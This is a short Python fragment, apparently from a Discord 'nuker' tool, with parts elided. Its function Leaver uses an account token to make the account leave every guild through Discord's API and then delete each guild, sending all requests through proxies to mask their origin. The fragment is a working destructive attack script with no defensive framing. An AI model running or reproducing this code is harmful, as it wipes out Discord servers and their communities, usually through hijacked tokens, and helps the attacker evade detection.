...
def Leaver(token, guilds):
    for guild in guilds:
        response = requests.delete(f'https://discord.com/api/v10/users/@me/guilds/'+guild['id'], proxies=proxy(), headers={'Authorization': token})
        if response.status_code == 204 or response.status_code == 200:
            ...
            requests.delete(f'https://discord.com/api/v10/guilds/'+guild['id'], proxies=proxy(), headers=getheaders(token))
